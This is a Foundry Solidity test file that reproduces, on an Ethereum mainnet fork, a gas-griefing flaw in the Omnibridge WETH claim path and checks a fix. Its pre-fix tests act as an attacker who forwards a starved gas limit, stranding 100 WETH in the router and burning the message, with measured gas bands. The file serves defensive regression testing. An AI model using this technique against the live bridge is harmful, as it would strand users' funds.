// SPDX-License-Identifier: GPL-3.0
// NOTE: was ^0.8.20, but ForeignOmnibridge.sol is pinned to 0.7.5 and setUp has to deploy it.
pragma solidity 0.7.5;
pragma abicoder v2;

import {Test} from "forge-std/Test.sol";
import {ForeignOmnibridge} from "../contracts/upgradeable_contracts/ForeignOmnibridge.sol";
import {EternalStorageProxy} from "../contracts/upgradeability/EternalStorageProxy.sol";

interface IBridgeValidators {
    function addValidator(address _validator) external;
    function removeValidator(address _validator) external;
    function setRequiredSignatures(uint256 _requiredSignatures) external;
    function isValidator(address _validator) external view returns (bool);
    function requiredSignatures() external view returns (uint256);
    function validatorCount() external view returns (uint256);
}

interface IForeignAMB {
    function safeExecuteSignatures(bytes calldata _data, bytes calldata _signatures) external;

    function safeExecuteSignaturesWithGasLimit(
        bytes calldata _data,
        bytes calldata _signatures,
        uint32 _gas
    ) external;

    function safeExecuteSignaturesWithAutoGasLimit(bytes calldata _data, bytes calldata _signatures) external;

    function executeSignatures(bytes calldata _data, bytes calldata _signatures) external;

    function relayedMessages(bytes32 _messageId) external view returns (bool);

    function messageCallStatus(bytes32 _messageId) external view returns (bool);

    function failedMessageReceiver(bytes32 _messageId) external view returns (address);

    function failedMessageSender(bytes32 _messageId) external view returns (address);
}

interface IFailedMessagesProcessor {
    function requestFailedMessageFix(bytes32 _messageId) external;
}


interface IERC20Balance {
    function balanceOf(address _account) external view returns (uint256);
}


// Environment: run in a fork environemnt in Ethereum
contract BasicOmnibridgeFixTest is Test {
    address constant OMNIBRIDGE = 0x88ad09518695c6c3712AC10a214bE5109a655671;
    address constant AMB = 0x4C36d2919e407f0Cc2Ee3c993ccF8ac26d9CE64e;
    address constant WETH_ROUTER = 0xa6439Ca0FCbA1d0F80df0bE6A17220feD9c9038a;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant BRIDGE_OWNER = 0x42F38ec5A75acCEc50054671233dfAC9C0E7A3F6;
    address constant VALIDATOR_CONTRACT = 0xed84a648b3c51432ad0fD1C2cD2C45677E9d4064;
    address constant HOME_OMNIBRIDGE = 0xf6A78083ca3e2a662D6dd1703c939c8aCE2e268d;
    address constant ATTACKER = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;

    // Gas the attacker forwards to the mediator: enough for the claim itself, not enough for
    // the router's unwrap callback on top of it. Measured on a mainnet fork for this 100 WETH
    // claim (block ~25.72M):
    //   <  87_000  whole tx reverts — the mediator itself OOGs, _validateExecutionStatus catches it
    //   87_000..131_000  GRIEF — WETH lands in the router, onTokenBridged OOGs, message burnt
    //   >= 131_250  honest delivery — recipient receives 100 ETH
    uint32 constant GRIEF_GAS = 100000;

    //messageId = MESSAGE_PACKING_VERSION | bridgeId | bytes32(nonce) = (keccak256(uint256(100), homeAMB) masked), with a nonce far above the live one.
    bytes32 constant MOCK_MESSAGE_ID = 0x00050000a7823d6f1e31569f51861e345b30c6bebf70ebe70000010000000000;

    // state variables
    address bridgeValidator;
    uint256 bridgeValidatorPrivateKey;
    uint256 constant WETH_AMOUNT = 100 ether;
    address recipient;
    bytes messageData;
    bytes messageSignatures;
    ForeignOmnibridge newForeignOmnibridgeImpl;

    function setUp() public {
     
        newForeignOmnibridgeImpl = new ForeignOmnibridge("on_ETH");

        // create mock bridge validator + add into validator list + set threshold to 1
        bridgeValidator = _createMockBridgeValidator();

        recipient = makeAddr("recipient");

        // create mock WETH claim message
        messageData = _createMockWETHClaimMessage(MOCK_MESSAGE_ID);

        // sign mock message from mock bridge validator
        messageSignatures = _signMessage(messageData);

        assertTrue(IBridgeValidators(VALIDATOR_CONTRACT).isValidator(bridgeValidator), "validator not added");
        assertEq(IBridgeValidators(VALIDATOR_CONTRACT).requiredSignatures(), 1, "threshold not 1");
        assertFalse(IForeignAMB(AMB).relayedMessages(MOCK_MESSAGE_ID), "message id already relayed");
    }

    // Before the fix
    // Use the current implementation in fork environment
    function test_preFix_safeExecuteSignaturesWithGasLimit_strandsWethInRouter() public {
        // Pre condition
        uint256 recipientWethBefore = IERC20Balance(WETH).balanceOf(recipient);
        uint256 routerWethBefore = IERC20Balance(WETH).balanceOf(WETH_ROUTER);
        uint256 bridgeWethBefore = IERC20Balance(WETH).balanceOf(OMNIBRIDGE);
        uint256 recipientEthBefore = recipient.balance;

        assertEq(recipientWethBefore, 0, "fresh recipient should hold no WETH");
        assertEq(recipientEthBefore, 0, "fresh recipient should hold no ETH");
        assertGe(bridgeWethBefore, WETH_AMOUNT, "bridge cannot cover the claim");

        // Attack: call safeExecuteSignaturesWithGasLimit with mock message and gasLimit = GRIEF_GAS.
        // Permissionless — the signatures are what authorise the claim, so anyone can pick the
        // gas limit that is forwarded to the mediator.
        vm.prank(ATTACKER);
        IForeignAMB(AMB).safeExecuteSignaturesWithGasLimit(messageData, messageSignatures, GRIEF_GAS);

        // Post condition:
        // Expected result: WETH is stored in Router instead of transferring to recipient.
        // _handleTokens already moved WETH to the router; only the onTokenBridged callback ran
        // out of gas, and BasicOmnibridge.sol:470 ignores its return value, so the claim is
        // still marked relayed and cannot be retried.
        assertEq(
            IERC20Balance(WETH).balanceOf(OMNIBRIDGE),
            bridgeWethBefore - WETH_AMOUNT,
            "bridge should have released WETH"
        );
        assertEq(
            IERC20Balance(WETH).balanceOf(WETH_ROUTER),
            routerWethBefore + WETH_AMOUNT,
            "WETH should be stuck in the router"
        );
        assertEq(IERC20Balance(WETH).balanceOf(recipient), recipientWethBefore, "recipient must not get WETH");
        assertEq(recipient.balance, recipientEthBefore, "recipient must not get unwrapped ETH");
        assertTrue(IForeignAMB(AMB).relayedMessages(MOCK_MESSAGE_ID), "message should be burnt as relayed");
    }

    /**
     * @dev Same grief through the other relay path. Plain executeSignatures takes the gas limit
     *      from the message header rather than from the caller, so the attacker starves it by
     *      crafting the header instead of by picking an argument.
     *
     *      executeSignatures does not revert on a failed mediator call,
     *      it records the outcome — and because the mediator call *succeeded* (only the discarded
     *      callback failed) the AMB marks the message as executed. That closes the rollback path,
     *      since requestFailedMessageFix requires !messageCallStatus.
     */
    function test_preFix_executeSignatures_strandsWethAndBlocksFix() public {
        bytes memory message = _createMockWETHClaimMessage(MOCK_MESSAGE_ID, GRIEF_GAS);
        bytes memory signatures = _signMessage(message);

        uint256 bridgeWethBefore = IERC20Balance(WETH).balanceOf(OMNIBRIDGE);

        vm.prank(ATTACKER);
        IForeignAMB(AMB).executeSignatures(message, signatures);

        // WETH left the bridge but never reached the recipient.
        assertEq(
            IERC20Balance(WETH).balanceOf(OMNIBRIDGE),
            bridgeWethBefore - WETH_AMOUNT,
            "bridge released the WETH"
        );
        assertEq(IERC20Balance(WETH).balanceOf(WETH_ROUTER), WETH_AMOUNT, "WETH stranded in the router");
        assertEq(recipient.balance, 0, "recipient must not get unwrapped ETH");

        // Recorded as a SUCCESSFUL execution, which is what removes the recovery path.
        assertTrue(IForeignAMB(AMB).relayedMessages(MOCK_MESSAGE_ID), "message relayed");
        assertTrue(IForeignAMB(AMB).messageCallStatus(MOCK_MESSAGE_ID), "recorded as success pre-fix");

        vm.expectRevert();
        IFailedMessagesProcessor(OMNIBRIDGE).requestFailedMessageFix(MOCK_MESSAGE_ID);
    }

    /**
     * @dev The AutoGasLimit path is structurally immune, before and after the fix. It forwards
     *      0xffffffff, so EIP-150 hands the mediator 63/64 of whatever is left and the AMB keeps
     *      only 1/64. For the AMB to have enough gas to finish its own bookkeeping, the mediator
     *      must have received ~63x that — always far above the grief band. So the outcome is
     *      binary: either the whole transaction reverts, or the claim completes correctly.
     *      Verified by sweeping tx gas from 200k to 3M: zero grief windows, first success at 275k.
     */
    function test_preFix_safeExecuteSignaturesWithAutoGasLimit_revertsOrDelivers() public {
        _assertAutoGasLimitRevertsOrDelivers();
    }
    // After the fix
    // Use the fixed environment for the newly deployed contract.
    //
    // With the guard in BasicOmnibridge._receiverCallback in place, the forwarded gas falls into
    // three bands for this 100 WETH claim (see GRIEF_GAS above for the pre-fix measurements):
    //     <  87_000            the mediator itself runs out of gas          -> revert
    //     87_000 .. 131_000    the callback is starved, guard catches it    -> revert (was the grief)
    //     >= 131_250           enough for the unwrap                        -> recipient gets 100 ETH
    // HONEST_GAS is picked comfortably past the top of that band.
    uint32 constant BELOW_GRIEF_GAS = 50000;
    uint32 constant HONEST_GAS = 200000;

    // Transaction-level budget for the AutoGasLimit path. Measured threshold is 275,000; below it
    // the relay reverts as a whole, and no value anywhere in 200k..3M produces a grief.
    uint256 constant AUTO_STARVED_TX_GAS = 200000;

    /// @dev Below the grief band: the claim reverts outright and no state survives.
    function test_postFix_belowGriefGas_reverts() public {
        _upgradeToFixedImplementation();

        uint256 bridgeWethBefore = IERC20Balance(WETH).balanceOf(OMNIBRIDGE);

        vm.prank(ATTACKER);
        vm.expectRevert();
        IForeignAMB(AMB).safeExecuteSignaturesWithGasLimit(messageData, messageSignatures, BELOW_GRIEF_GAS);

        assertEq(IERC20Balance(WETH).balanceOf(OMNIBRIDGE), bridgeWethBefore, "no WETH should leave the bridge");
        assertEq(IERC20Balance(WETH).balanceOf(WETH_ROUTER), 0, "nothing stranded in the router");
        assertEq(IERC20Balance(WETH).balanceOf(recipient), 0, "recipient must not get WETH");
        assertEq(recipient.balance, 0, "recipient must not get ETH");
        assertFalse(IForeignAMB(AMB).relayedMessages(MOCK_MESSAGE_ID), "message must stay replayable");
    }

    /// @dev At GRIEF_GAS itself — the exact value that stranded WETH before the fix.
    function test_postFix_atGriefGas_reverts() public {
        _upgradeToFixedImplementation();

        vm.prank(ATTACKER);
        vm.expectRevert();
        IForeignAMB(AMB).safeExecuteSignaturesWithGasLimit(messageData, messageSignatures, GRIEF_GAS);

        assertEq(IERC20Balance(WETH).balanceOf(WETH_ROUTER), 0, "grief must no longer be possible");
        assertFalse(IForeignAMB(AMB).relayedMessages(MOCK_MESSAGE_ID), "message must stay replayable");
    }

    /// @dev Above the grief band: the claim settles and the router unwraps to the recipient.
    function test_postFix_aboveGriefGas_delivers() public {
        _upgradeToFixedImplementation();

        uint256 bridgeWethBefore = IERC20Balance(WETH).balanceOf(OMNIBRIDGE);

        vm.prank(ATTACKER);
        IForeignAMB(AMB).safeExecuteSignaturesWithGasLimit(messageData, messageSignatures, HONEST_GAS);

        assertEq(
            IERC20Balance(WETH).balanceOf(OMNIBRIDGE),
            bridgeWethBefore - WETH_AMOUNT,
            "bridge should have released WETH"
        );
        assertEq(IERC20Balance(WETH).balanceOf(WETH_ROUTER), 0, "router should have unwrapped everything");
        assertEq(IERC20Balance(WETH).balanceOf(recipient), 0, "recipient receives ETH, not WETH");
        assertEq(recipient.balance, WETH_AMOUNT, "recipient should receive the unwrapped ETH");
        assertTrue(IForeignAMB(AMB).relayedMessages(MOCK_MESSAGE_ID), "message should be relayed");
    }

    /**
     * @dev The other relay path. Plain executeSignatures ignores any caller-supplied gas and uses
     *      the gasLimit baked into the message header, and unlike the safeExecuteSignatures*
     *      variants it does NOT revert when the mediator call fails — it records the failure.
     */
    function test_postFix_executeSignatures_starvedHeaderGasLimitIsRecoverable() public {
        _upgradeToFixedImplementation();

        bytes32 messageId = bytes32(uint256(MOCK_MESSAGE_ID) + 2);
        bytes memory message = _createMockWETHClaimMessage(messageId, GRIEF_GAS);
        bytes memory signatures = _signMessage(message);

        uint256 bridgeWethBefore = IERC20Balance(WETH).balanceOf(OMNIBRIDGE);

        // Does not revert: plain executeSignatures swallows the failed mediator call.
        vm.prank(ATTACKER);
        IForeignAMB(AMB).executeSignatures(message, signatures);

        // Nothing moved — no WETH released, nothing stranded in the router.
        assertEq(IERC20Balance(WETH).balanceOf(OMNIBRIDGE), bridgeWethBefore, "no WETH should be released");
        assertEq(IERC20Balance(WETH).balanceOf(WETH_ROUTER), 0, "nothing should be stranded in the router");
        assertEq(IERC20Balance(WETH).balanceOf(recipient), 0, "recipient must not get WETH");
        assertEq(recipient.balance, 0, "recipient must not get unwrapped ETH");

        // Recorded as a failed message rather than a successful one.
        assertTrue(IForeignAMB(AMB).relayedMessages(messageId), "message should be marked relayed");
        assertFalse(IForeignAMB(AMB).messageCallStatus(messageId), "call status should be failure");
        assertEq(IForeignAMB(AMB).failedMessageReceiver(messageId), OMNIBRIDGE, "failed receiver");
        assertEq(IForeignAMB(AMB).failedMessageSender(messageId), HOME_OMNIBRIDGE, "failed sender");

        // And the rollback path is open: this passes a fixFailedMessage request back to the
        // Home mediator, which returns the tokens to the original sender.
        IFailedMessagesProcessor(OMNIBRIDGE).requestFailedMessageFix(messageId);
    }

    /// @dev Same result as pre-fix: the guard changes nothing on a path that was never griefable.
    function test_postFix_safeExecuteSignaturesWithAutoGasLimit_revertsOrDelivers() public {
        _upgradeToFixedImplementation();
        _assertAutoGasLimitRevertsOrDelivers();
    }

    /**
     * @dev Asserts the two halves of the AutoGasLimit outcome: a constrained transaction budget
     *      fails cleanly with nothing stranded, and an unconstrained one delivers in full.
     */
    function _assertAutoGasLimitRevertsOrDelivers() internal {
        bytes memory callData =
            abi.encodeWithSignature(
                "safeExecuteSignaturesWithAutoGasLimit(bytes,bytes)", messageData, messageSignatures
            );

        // Below the threshold: the whole transaction fails, nothing settles anywhere.
        uint256 snapshotId = vm.snapshot();
        uint256 bridgeWethBefore = IERC20Balance(WETH).balanceOf(OMNIBRIDGE);
        (bool success, ) = AMB.call{ gas: AUTO_STARVED_TX_GAS }(callData);
        assertFalse(success, "starved auto-gas relay should fail outright");
        assertEq(IERC20Balance(WETH).balanceOf(OMNIBRIDGE), bridgeWethBefore, "no WETH should leave the bridge");
        assertEq(IERC20Balance(WETH).balanceOf(WETH_ROUTER), 0, "nothing stranded in the router");
        assertEq(recipient.balance, 0, "recipient must not get ETH");
        vm.revertTo(snapshotId);

        // With a normal budget: the claim completes and the router unwraps to the recipient.
        bridgeWethBefore = IERC20Balance(WETH).balanceOf(OMNIBRIDGE);
        vm.prank(ATTACKER);
        IForeignAMB(AMB).safeExecuteSignaturesWithAutoGasLimit(messageData, messageSignatures);

        assertEq(
            IERC20Balance(WETH).balanceOf(OMNIBRIDGE),
            bridgeWethBefore - WETH_AMOUNT,
            "bridge should have released WETH"
        );
        assertEq(IERC20Balance(WETH).balanceOf(WETH_ROUTER), 0, "router should have unwrapped everything");
        assertEq(recipient.balance, WETH_AMOUNT, "recipient should receive the unwrapped ETH");
    }

    
    /// @dev Upgrades the ForeignOmnibridge proxy to the locally built implementation.
    function _upgradeToFixedImplementation() internal {
        EternalStorageProxy proxy = EternalStorageProxy(payable(OMNIBRIDGE));
        uint256 nextVersion = proxy.version() + 1;
        vm.prank(BRIDGE_OWNER);
        proxy.upgradeTo(nextVersion, address(newForeignOmnibridgeImpl));
    }


    /**
     * @dev Builds the AMB message for a WETH claim routed through WETHOmnibridgeRouter, which is
     *      the griefable path: the recipient is the router, and the real recipient is the 20-byte
     *      payload the router reads in onTokenBridged before unwrapping. BasicOmnibridge invokes
     *      that callback with a bare `.call` whose result is ignored (BasicOmnibridge.sol:470),
     *      so if it runs out of gas the claim still succeeds and WETH is left in the router.
     */
    function _createMockWETHClaimMessage(bytes32 mesgId) public view returns (bytes memory) {
        return _createMockWETHClaimMessage(mesgId, 1000000);
    }

    /// @dev Same, with an explicit header gasLimit — the value plain executeSignatures honours.
    function _createMockWETHClaimMessage(bytes32 mesgId, uint32 headerGasLimit)
        public
        view
        returns (bytes memory)
    {
        bytes memory data =
            abi.encodeWithSignature(
                "handleNativeTokensAndCall(address,address,uint256,bytes)",
                WETH,
                WETH_ROUTER,
                WETH_AMOUNT,
                abi.encodePacked(recipient)
            );

        // AMB ArbitraryMessage envelope: 32 messageId | 20 sender | 20 executor | 4 gasLimit
        // | 1 srcChainIdLen | 1 dstChainIdLen | 1 dataType | srcChainId | dstChainId | data.
        // The header gasLimit is ignored by safeExecuteSignaturesWithGasLimit (it passes _gas
        // instead) but is used by plain executeSignatures.
        return
            abi.encodePacked(
                mesgId,
                HOME_OMNIBRIDGE,
                OMNIBRIDGE,
                headerGasLimit,
                uint8(1),
                uint8(1),
                uint8(0),
                uint8(100), // source chain id: Gnosis Chain
                uint8(1), // destination chain id: Ethereum
                data
            );
    }

    function _createMockBridgeValidator() public returns (address) {
        (address validator, uint256 privateKey) = makeAddrAndKey("mockBridgeValidator");
        bridgeValidatorPrivateKey = privateKey;

        vm.startPrank(BRIDGE_OWNER);
        IBridgeValidators(VALIDATOR_CONTRACT).addValidator(validator);
        IBridgeValidators(VALIDATOR_CONTRACT).setRequiredSignatures(1);
        vm.stopPrank();

        return validator;
    }

    /**
     * @dev Signs the digest the AMB recovers against: Message.hashMessage(_message, true) ==
     *      keccak256("\x19Ethereum Signed Message:\n" || decimalAsciiLength || message).
     *      Blob layout is [uint8 count][count v bytes][count*32 r][count*32 s].
     */
    function _signMessage(bytes memory _message) internal returns (bytes memory) {
        bytes32 digest =
            keccak256(
                abi.encodePacked("\x19Ethereum Signed Message:\n", vm.toString(_message.length), _message)
            );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(bridgeValidatorPrivateKey, digest);
        return abi.encodePacked(uint8(1), v, r, s);
    }
}
